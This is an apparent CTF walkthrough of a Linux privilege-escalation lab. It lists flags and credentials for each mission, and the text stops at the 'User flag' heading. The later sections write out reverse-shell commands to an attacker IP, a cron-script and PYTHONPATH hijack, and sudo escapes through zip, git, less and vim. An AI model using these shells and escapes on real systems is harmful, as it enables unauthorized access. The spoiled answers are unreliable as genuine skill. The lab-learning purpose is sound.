# IP
10.10.36.144

# Mission 1 Flag
- Secure shell into the machine with credentials provided `agent47:640509040147`

```console
❯ ssh agent47@10.10.36.144
The authenticity of host '10.10.36.144 (10.10.36.144)' can't be established.
ED25519 key fingerprint is SHA256:FaS8GFNr+3UXf7F3dwtW1e3iN+IHyDOiulUbd7gptO4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.36.144' (ED25519) to the list of known hosts.
agent47@10.10.36.144's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
```

- We are prompted with the mission 1 flag
- Changed user to mission1  with the password `mission1{174dc8f191bcbb161fe25f8a5b58d1f0}`


# Mission 2 Flag
- Found flag as file in home directory of mission1 user

```console
mission1@linuxagency:~$ ls
mission2{8a1b68bb11e4a35245061656b5b9fa0d}
```


# Mission 3 flag
- Change user to mission2 with password `mission2{8a1b68bb11e4a35245061656b5b9fa0d}`

```console
mission1@linuxagency:~$ su mission2
Password:
```

- Found flag in home directory of `mission2`.

```console
mission2@linuxagency:~$ ls
flag.txt
mission2@linuxagency:~$ cat flag.txt 
mission3{ab1e1ae5cba688340825103f70b0f976}
```

# Mission 4 flag 
- Change user to `mission3`

```console
mission2@linuxagency:~$ su mission3
Password:
```

- Found a text file with name flag.txt, which says that the flag is stolen.

```console
mission3@linuxagency:~$ ls
flag.txt
mission3@linuxagency:~$ cat flag.txt
I am really sorry man the flag is stolen by some thief's.
```

- This file contains CR,LF line terminators 

```console
mission3@linuxagency:~$ file flag.txt
flag.txt: ASCII text, with CR, LF line terminators
```

- Read file with strings

```console
mission3@linuxagency:~$ strings flag.txt
mission4{264a7eeb920f80b3ee9665fafb7ff92d}
I am really sorry man the flag is stolen by some thief's.



```

# Mission 5 Flag
- Changed user to `mission4`, and found flag in `/home/mission4/flag/flag.txt`

```console
mission3@linuxagency:~$ su mission4
Password:
mission4@linuxagency:/home/mission3$ cd
mission4@linuxagency:~$ ls
flag
mission4@linuxagency:~$ cd flag/
mission4@linuxagency:~/flag$ ls
flag.txt
mission4@linuxagency:~/flag$ ls -a
.  ..  flag.txt
mission4@linuxagency:~/flag$ cat flag.txt
mission5{bc67906710c3a376bcc7bd25978f62c0}
```

# Mission 6 flag
- Change user to mission5 and found flag in `/home/mission5/.flag.txt`

```console
mission4@linuxagency:~/flag$ su mission5
Password:
mission5@linuxagency:/home/mission4/flag$ cd
mission5@linuxagency:~$ ls
mission5@linuxagency:~$ ls -a
.  ..  .bash_history  .bashrc  .flag.txt  .profile
mission5@linuxagency:~$ cat .flag.txt
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
```

# Mission 7 Flag
- Change your user to mission6 and found flag in `/home/mission6/.flag/flag.txt`

```console
mission5@linuxagency:~$ su mission6
Password: 
mission6@linuxagency:/home/mission5$ cd
mission6@linuxagency:~$ ls
mission6@linuxagency:~$ ls -a
.  ..  .bash_history  .bashrc  .flag  .profile
mission6@linuxagency:~$ cd .flag/
mission6@linuxagency:~/.flag$ ls
flag.txt
mission6@linuxagency:~/.flag$ cat flag.txt 
mission7{53fd6b2bad6e85519c7403267225def5}
```

# Mission 8 Flag
- Change user to mission7.
- But own doing `cd` the user didn't allow me indexing, so checked for home directory.
- Found flag in `/home/mission7/flag.txt`

```console
mission7@linuxagency:~$ cd /home/mission7
mission7@linuxagency:/home/mission7$ ls
flag.txt
mission7@linuxagency:/home/mission7$ cat flag.txt 
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
mission7@linuxagency:/home/mission7$ 
```

# Mission 9 Flag
- Changed user to `mission8`.
- But didn't find flag in home directory.
- Searched with find command

```console
mission8@linuxagency:~$ find / -name "flag.txt" -user mission8 2>/dev/null
/flag.txt
mission8@linuxagency:~$ cat /flag.txt
mission9{ba1069363d182e1c114bef7521c898f5}
```

# Mission 10 flag
- Changed user to `mission9`, but found a `rockyou.txt` file.
- Searched for flag inside this file.

```console
mission9@linuxagency:~$ cat rockyou.txt  | grep mission10{
mission10{0c9d1c7c5683a1a29b05bb67856524b6}
```

# Mission 11 flag
- Changed to user `mission11`.
- Found a directory named `folder`.

```console
mission10@linuxagency:~$ ls
folder
```

- Found 10 more directories.

```console
mission10@linuxagency:~/folder$ ls
L4D1  L4D10  L4D2  L4D3  L4D4  L4D5  L4D6  L4D7  L4D8  L4D9
```

- These have further sub-directories.
- `tree` is not installed  in the system.
- So used `du -a`

```console
mission10@linuxagency:~$ du -a | grep flag.txt
4	./folder/L4D8/L3D7/L2D2/L1D10/flag.txt
```

- Found the flag

```console
mission10@linuxagency:~$ cat ./folder/L4D8/L3D7/L2D2/L1D10/flag.txt
mission11{db074d9b68f06246944b991d433180c0}
```

# Mission flag 12
- Changed user to mission11, found flag in `.bashrc` as `export`.

```console
mission11@linuxagency:~$ cat .bashrc
<------------------------------------------------------snip------------------------------------------------------------------->
# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
export FLAG=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
export flag=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

- Got the flag.

```console
mission11@linuxagency:~$ echo $FLAG
mission12{f449a1d33d6edc327354635967f9a720}
```

# Mission Flag 13
- Found the flag put don't have read permissions do gave it and got the flag.

```console
mission12@linuxagency:~$ ls
flag.txt
mission12@linuxagency:~$ cat flag.txt
cat: flag.txt: Permission denied
mission12@linuxagency:~$ ls -l
total 4
---------- 1 mission12 mission12 44 Jan 12  2021 flag.txt
mission12@linuxagency:~$ chmod +r flag.txt
mission12@linuxagency:~$ cat flag.txt
mission13{076124e360406b4c98ecefddd13ddb1f}
```

# Mission Flag 14
- Found the flag but it is encoded as `base64`.

```console
mission13@linuxagency:~$ ls
flag.txt
mission13@linuxagency:~$ cat flag.txt
bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
mission13@linuxagency:~$ cat flag.txt | base64 -d
mission14{d598de95639514b9941507617b9e54d2}
```

# Mission Flag 15
- Found the flag but it is in binary format, so converted it from [here](https://www.binaryhexconverter.com/binary-to-ascii-text-converter){:target="\_blank"} .

```console
mission14@linuxagency:~$ cat flag.txt
01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
```

# Mission flag 16
- Found the flag but it seems to be encoded as a hash.

```console
mission15@linuxagency:~$ cat flag.txt
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
```

- Copied it to my machine and checked for hash, but it is not a hash.

```console
❯ echo "6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D" | hash-identifier
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH:
 Not Found.
--------------------------------------------------
 HASH: Traceback (most recent call last):
  File "/usr/share/hash-identifier/hash-id.py", line 568, in <module>
    h = input(" HASH: ")
EOFError: EOF when reading a line
```

- Checked on [cyberchef](https://cyberchef.io/){:target="\_blank"}, this is a hexadecimal code.
- Found the flag 

```console
mission16{884417d40033c4c2091b44d7c26a908e}
```

# Mission Flag 17
- Found a binary named flag.
- Tried running it, permission denied :smiling_face_with_tear: .
- Gave it executable permission and executed it, got the flag :upside_down_face: .

```console
mission16@linuxagency:~$ ls
flag
mission16@linuxagency:~$ cat flag
ELF>0@�@8	@@@@�888

 ``/lib64/ld-linux-x86-64.so.2GNUGNU/{��2�q��|�J��!g
                                                     )?� � 0"libc.so.6puts__stack_chk_failputcharstrlen__cxa_finalize__libc_start_mainGLIBC_2.4GLIBC_2.2.5_ITM_deregisterTMCloneTable__ � � � �� ___ITM� � � � H�H�%oneTableii
]��f.�]�@f.�H�=i UH��	 H�5b��t UH)�H��H��H��H��?H�H��tH�!	 H��t���%�	 h�����%�	 f�1�I��^H��H���PTL�ZH�
                                                                     ]��f�]�@f.��=	 u/H�= UH��t
����H���� ]����fDUH��]�f���UH��H��PdH�%(H�E�1�H�=\����H�gcyyced;H�=q>3l2n;H�E�H�U�H�9>2k;:?9H�o88;nlo=H�E�H�U�H�ll33l?ihH�E��E�l>wH�E�H���J����E��E��0�E�H��D���
�E�H��T��E�H��D�����������E��E�;E�|�H�=�������H�M�dH3
                                                     %(t�������f.�DAWAVI��AUATL�%^ UH�-^ SA��I��L)�H�H���W���H��t 1��L��L��D��A��H��H9�u�H�[]A\A]A^A_Ðf.���H�H��
<����h����x���X�����x��������0zRx
                                ���+zRx
                                      $����PFJ
�                                             �?�;*3$"D���\�����A�C
D|����eB�B�E �B(�H0�H8�M@r8A0A(B BB�����0�
���o���                                   �
�
 � GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.08Tt���h	�
X
 �
 �   ��
]q�� �  ��e� �0+� :�  +"�
                         �crtstuff.cderegister_tm_clones__do_global_dtors_auxcompleted.7698__do_global_dtors_aux_fini_array_entryframe_dummy__frame_dummy_init_array_entryflag.c__FRAME_END____init_array_end_DYNAMIC__init_array_start__GNU_EH_FRAME_HDR_GLOBAL_OFFSET_TABLE___libc_csu_finiputchar@@GLIBC_2.2.5_ITM_deregisterTMCloneTableputs@@GLIBC_2.2.5_edatastrlen@@GLIBC_2.2.5__stack_chk_fail@@GLIBC_2.4__libc_start_main@@GLIBC_2.2.5__data_start__gmon_start____dso_handle_IO_stdin_used__libc_csu_init__bss_startmain__TMC_END___ITM_registerTMCloneTable__cxa_finalize@@GLIBC_2.2.5.symtab.strtab.shstrtab.interp.note.ABI-tag.note.gnu.build-id.gnu.hash.dynsym.dynstr.gnu.version.gnu.version_r.rela.dyn.rela.plt.init.plt.got.text.fini.roda8#TT 1tt$D���o�Neh_frame.init_array.fini_array.dynamic.data.bss.comment
�� ��0)@0       pG��mission16@linuxagency:~$ ����P�00r�������
mission16@linuxagency:~$
mission16@linuxagency:~$ ./flag
bash: ./flag: Permission denied
mission16@linuxagency:~$ chmod +x flag
mission16@linuxagency:~$ ./flag


mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```

# Mission Flag 18
- Found the flag but it seems to be a java code.

```console
mission17@linuxagency:~$ cat flag.java
import java.util.*;
public class flag
{
    public static void main(String[] args)
    {
        String outputString="";
        String encrypted_flag="`d~~dbc<5vk=4:;=;9445;o954nil>?=lo8k:4<:h5p";
        int length = encrypted_flag.length();
        for (int i = 0 ; i < length ; i++)
        {
            outputString = outputString + Character.toString((char) (encrypted_flag.charAt(i) ^ 13));
        }
        System.out.println(outputString);
    }
}
```
- Tried running it with `javac`

```console
mission17@linuxagency:~$ ls
flag.java
mission17@linuxagency:~$ javac flag.java
mission17@linuxagency:~$ java flag
mission18{f09760649986b489cda320ab5f7917e8}
```

- Found the flag


# Mission flag 19
- Found a ruby file.

```console
mission18@linuxagency:~$ ls
flag.rb
mission18@linuxagency:~$ ruby flag.rb
mission19{a0bf41f56b3ac622d808f7a4385254b7}
```


# Mission Flag 20
- Found a C file.
- Compiled it with gcc, but got an error.

```console
mission19@linuxagency:~$ gcc flag.c -o flag
flag.c: In function ‘main’:
flag.c:5:18: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
     int length = strlen(flag);
                  ^~~~~~
flag.c:5:18: warning: incompatible implicit declaration of built-in function ‘strlen’
flag.c:5:18: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
```

- We need to include `<string.h>`

```c
#include<stdio.h>
int main()
{
    char flag[] = "gcyyced8:qh:>28l3o3:i2kn8>8;hl>9?9in2oko;iw";
    int length = strlen(flag);
    for (int i = 0 ; i < length ; i++)
    {
        flag[i] = flag[i] ^ 10;
        printf("%c",flag[i]);
    }
    printf("\n\n");
    return 0;
}
```
- Gave writing permission to `flag.c` and edited the file. 

```c
#include<stdio.h>
#include<string.h>
int main()
{
    char flag[] = "gcyyced8:qh:>28l3o3:i2kn8>8;hl>9?9in2oko;iw";
    int length = strlen(flag);
    for (int i = 0 ; i < length ; i++)
    {
        flag[i] = flag[i] ^ 10;
        printf("%c",flag[i]);
    }
    printf("\n\n");
    return 0;
}
```

- Now compiled the code.

```console
mission19@linuxagency:~$ gcc flag.c -o flag
mission19@linuxagency:~$ ./flag
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
```

# Mission Flag 21
- Found a python file

```console
mission20@linuxagency:~$ ls
flag.py
mission20@linuxagency:~$ python3 flag.py
mission21{7de756aabc528b446f6eb38419318f0c}
```


# Mission flag 22
- Changed user to mission21.
- Got flag in `.bashrc`.

```console
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

<----------------snip--------------------------------->

# Add an "alert" alias for long running commands.  Use like so:
echo "fWZhYTk0ZDI0YjQ4OTZlMmE2ZGU5ODgwYmU0N2FhYzQyezIybm9pc3NpbQo="|base64 -d|rev
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
```

- Executed the same command and got the flag.

```console
$ echo "fWZhYTk0ZDI0YjQ4OTZlMmE2ZGU5ODgwYmU0N2FhYzQyezIybm9pc3NpbQo="|base64 -d|rev
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```


# Mission Flag 23
- On Changing user to `mission22` and got a python interpreter.
- Imported os library, searched for flag and read it.

```console
mission21@linuxagency:~$ su mission22
Password:
Python 3.6.9 (default, Oct  8 2020, 12:12:24)
[GCC 8.4.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import os
>>> os.system("ls /home/mission22")
flag.txt
0
>>> os.system("cat /home/mission22/flag.txt")
mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
0
```


# Mission flag 24
- The home directory contains `message.txt`, which says, we need to take help from hosts.

```console
mission23@linuxagency:~$ ls
message.txt
mission23@linuxagency:~$ cat message.txt
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
```

- Checked out `/etc/hosts` and found `mission24.com`.
- Used curl to check flag

```console
mission23@linuxagency:~$ curl mission24.com | grep mission
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
    <title>mission24{dbaeb06591a7fd6230407df3a947b89c}</title>
100 10924  100 10924    0     0  1333k      0 --:--:-- --:--:-- --:--:-- 1333k

```

# Mission Flag 25
- Found a binary `bribe`, executed it.

```console
mission24@linuxagency:~$ ./bribe


There is a guy who is smuggling flags
Bribe this guy to get the flag
Put some money in his pocket to get the flag

Words are not the price for your flag
Give Me money Man!!!
```

- Checked it with `ltrace`, but didn't find anything. 

```console
mission24@linuxagency:~$ ltrace ./bribe
getenv("pocket")                                                                                                 = nil
getenv("init")                                                                                                   = nil
puts("\n\nThere is a guy who is smugglin"...

There is a guy who is smuggling flags
)                                                                    = 40
puts("Bribe this guy to get the flag"Bribe this guy to get the flag
)                                                                           = 31
puts("Put some money in his pocket to "...Put some money in his pocket to get the flag
)                                                                      = 45
system("export init=abc" <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                           = 0
puts("\nWords are not the price for you"...
Words are not the price for your flag
)                                                                     = 39
puts("Give Me money Man!!!\n"Give Me money Man!!!

)                                                                                   = 22
+++ exited (status 0) +++
```

- Loaded this file to ghidra and found that we need to set pocket environment variable to money

![ghidra screenshot](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/11.png)

- Set pocket as money and execute the file.

```console
mission24@linuxagency:~$ export pocket=money
mission24@linuxagency:~$ ./bribe
Here ya go!!!
mission25{61b93637881c87c71f220033b22a921b}
Don't tell police about the deal man ;)
```

# Mission Flag 26
- We are not allowed to execute ls and cat commands.
- Listed directory and read contents with `echo`

```console
mission25@linuxagency:~$ echo *
flag.txt
mission25@linuxagency:~$ echo "$(<flag.txt)"
mission26{cb6ce977c16c57f509e9f8462a120f00}

```

- Changed user with `/bin/su`.

```console
mission25@linuxagency:~$ /bin/su mission26
Password:
mission26@linuxagency:/home/mission25$
```

# Mission Flag 27
- Found a flag.jpg checked file with file command

```console
mission26@linuxagency:~$ file flag.jpg
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, comment: "mission27{444d29b932124a48e7dddc0595788f4d}", progressive, precision 8, 1000x1870, frames 3
```
- Found the flag 

# Mission flag 28
- Copied this file to /tmp and scp to local machine.
- Unzipped the file `flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz`.

```console
❯ 7z x flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD Ryzen 3 3250U with Radeon Graphics          (810F81),ASM,AES-NI)

Scanning the drive for archives:
1 file, 136 bytes (1 KiB)

Extracting archive: flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
--
Path = flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
Type = gzip
Headers Size = 75

Everything is Ok

Size:       51
Compressed: 136
```

- Checked for strings in `flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png`

```console
❯ strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
GIF87a
mission28{03556f8ca983ef4dc26d2055aef9770f}
```


# Mission Flag 29
- Found ruby interpreter
- Started bash 
- Found `txt.galf`
- Read it, reversed it and found the flag

```console
mission27@linuxagency:~$ su mission28
Password:
irb(main):001:0> exec "/bin/bash"
mission28@linuxagency:/home/mission27$ ls
ls: cannot open directory '.': Permission denied
mission28@linuxagency:/home/mission27$ cd
mission28@linuxagency:~$ ls
examples.desktop  txt.galf
mission28@linuxagency:~$ cat txt.galf
}1fff2ad47eb52e68523621b8d50b2918{92noissim
mission28@linuxagency:~$ cat txt.galf  | rev
mission29{8192b05d8b12632586e25be74da2fff1}

```

# Flag 30
- Found flag in ~/bludit/.htpasswd

```console
mission29@linuxagency:~/bludit$ cat .htpasswd
mission30{d25b4c9fac38411d2fcb4796171bda6e}
```

# Viktor's flag
- Checked for git logs under `~/Escalator`

```console
mission30@linuxagency:~/Escalator$ git log
commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -> master, origin/master)
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:37:56 2021 +0530

    My 1st python Script

commit e0b807dbeb5aba190d6307f072abb60b34425d44
Author: root <root@Xyan1d3>
Date:   Mon Jan 11 15:36:40 2021 +0530

    Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}

```

# Dalia's flag
- On checking `cronjobs` , found a cronjob running as dalia, executing /opt/scripts/47.sh.

```console
viktor@linuxagency:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user	command
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*  *	* * *	dalia	sleep 30;/opt/scripts/47.sh
*  *	* * *	root	echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;
```

- /opt/scripts/47.sh is writable 

```console
viktor@linuxagency:~$ ls -l /opt/scripts/47.sh
-rwxr-xr-x 1 viktor viktor 106 Nov 21 04:06 /opt/scripts/47.sh
```
- Added reverse shell code to the file

```console
viktor@linuxagency:~$ echo "sh -i >& /dev/tcp/10.17.0.215/4444 0>&1" >> /opt/scripts/47.sh
```

- Got a shell and stabilized it 

```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.219.213] 41634
sh: 0: can't access tty; job control turned off
$ python3 -c "import pty; pty.spawn('/bin/bash')"
dalia@linuxagency:~$ ^Z
[1]+  Stopped                 nc -lvnp 4444

┌──(divu050704㉿kali)-[~]
└─$ stty raw -echo && fg
nc -lvnp 4444

dalia@linuxagency:~$ 
dalia@linuxagency:~$ 
dalia@linuxagency:~$ 
dalia@linuxagency:~$ 
dalia@linuxagency:~$ ls
examples.desktop  flag.txt
dalia@linuxagency:~$ cat flag.txt 
dalia{4a94a7a7bb4a819a63a33979926c77dc}
dalia@linuxagency:~$ 
```


# Silvio's flag

- Found that Dalia can run zip without password as `Silvio`

```console
dalia@linuxagency:~$ TF=$(mktemp -u)
dalia@linuxagency:~$ sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 37%)
$ /bin/bash
silvio@linuxagency:/home/dalia$ whoami
silvio
```

- Found the flag

```console
siClvio@linuxagency:~$ cat flag.txt
silvio{657b4d058c03ab9988875bc937f9c2ef}
```


# Reza's Flag

- Silvio can run git as Reza

```console
silvio@linuxagency:~$ sudo -l
Matching Defaults entries for silvio on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User silvio may run the following commands on linuxagency:
    (reza) SETENV: NOPASSWD: /usr/bin/git
silvio@linuxagency:~$ sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
$ whoami
reza
$ cd
$ ls
examples.desktop  flag.txt
$ cat fl
cat: fl: No such file or directory
$ cat flag.txt
reza{2f1901644eda75306f3142d837b80d3e}
```

# Jordan's Flag
- Reza can run `/opt/scripts/Gun-Shop.py` .
- On running this script as jordan, an `ModuleNotFoundError` occurs for module shop.

```console
reza@linuxagency:/home/dalia$ sudo -u jordan /opt/scripts/Gun-Shop.py
Traceback (most recent call last):
  File "/opt/scripts/Gun-Shop.py", line 2, in <module>
    import shop
ModuleNotFoundError: No module named 'shop'
```

- Let's create a random python file `shop.py` in `/tmp` and set it as `PYTHONENV`, while running it.

```console
reza@linuxagency:~$ sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
Welcome to Gun-Shop
Here's the list of all guns we have at our shop

1. American Derringer DA 38 : $910
2. AMP Auto Mag Model 180 : $820
3. AMT Hardballer : $750
4. Colt King Cobra : $670
5. EAA Witness Limited Gold Team : $610
6. Ruger Mk II : $550
7. SIG-Sauer P226R : $500
Enter your choice : 1
Traceback (most recent call last):
  File "/opt/scripts/Gun-Shop.py", line 8, in <module>
    shop.buy(guns[response])
AttributeError: module 'shop' has no attribute 'buy'
```

- We need to create a function inside `shop.py` to create a reverse shell as jordan.

```python
import os
def buy(param):
    os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.0.215 1234 >/tmp/f")
```

- Executed the file `sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py`

```console
reza@linuxagency:~$ sudo -u jordan PYTHONPATH=/tmp/ /opt/scripts/Gun-Shop.py
Welcome to Gun-Shop
Here's the list of all guns we have at our shop

1. American Derringer DA 38 : $910
2. AMP Auto Mag Model 180 : $820
3. AMT Hardballer : $750
4. Colt King Cobra : $670
5. EAA Witness Limited Gold Team : $610
6. Ruger Mk II : $550
7. SIG-Sauer P226R : $500
Enter your choice : 1
rm: cannot remove '/tmp/f': No such file or directory
```

- Got a reverse shell as jordan

```console
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.17.0.215] from (UNKNOWN) [10.10.219.213] 59866
$ python -c "import pty; pty.spawn('/bin/bash')"
```


# Ken's Flag
- We can run less as ken on the machine.

```console
jordan@linuxagency:~$ sudo -l
Matching Defaults entries for jordan on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jordan may run the following commands on linuxagency:
    (ken) NOPASSWD: /usr/bin/less
jordan@linuxagency:~$ sudo less /etc/profile

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

Password:
sudo: a password is required
jordan@linuxagency:~$ sudo  -u ken less /etc/profile
ken@linuxagency:/home/jordan$ cd
ken@linuxagency:~$ ls
examples.desktop  flag.txt
ken@linuxagency:~$ cat flag.txt
ken{4115bf456d1aaf012ed4550c418ba99f}
```

# Sean's Flag

- We can run vim as sean.
- Started a shell as sean from vim.

```console
ken@linuxagency:~$ sudo -l
Matching Defaults entries for ken on linuxagency:
    env_reset, env_file=/etc/sudoenv, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User ken may run the following commands on linuxagency:
    (sean) NOPASSWD: /usr/bin/vim
ken@linuxagency:~$ sudo -u sean  vim -c ':!/bin/bash'

sean@linuxagency:/home/ken$ cd
sean@linuxagency:~$ ls

```

- Hint says to search in attendance register, which may be `/var/log/`
- Searched for flag and found it

```console
sean@linuxagency:/var/log$ grep -rn "sean{" .  2>/dev/null
./syslog.bak:98675:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlb
mVsb3BlIGlzIHAzbmVsb3BlCg==

```

# Penelope's  flag

- While searching for Sean's flag we saw a base64 code which on decoding gives Penelope's password

```console
❯ echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d
The password of penelope is p3nelope
```


```console
penelope@linuxagency:~$ cat flag.txt
penelope{2da1c2e9d2bd0004556ae9e107c1d222}
```

# Maya's Flag

- In the home directory of Penelope we can see a base64 SUID which we can run as maya.


```console
penelope@linuxagency:~$ ls -l
total 56
-rwsr-sr-x 1 maya     maya     39096 Jan 12  2021 base64
-rw-r--r-- 1 penelope penelope  8980 Jan 12  2021 examples.desktop
-r-------- 1 penelope penelope    43 Jan 12  2021 flag.txt
penelope@linuxagency:~$ ./base64 /home/maya/flag.txt | ./base64 -d
maya{a66e159374b98f64f89f7c8d458ebb2b}
```

- In hint we can see password == flag. 
- Changed user with flag.

# User flag 
- We can get id_rsa of Robert from the machine.

```console
maya@linuxagency:~$ ls
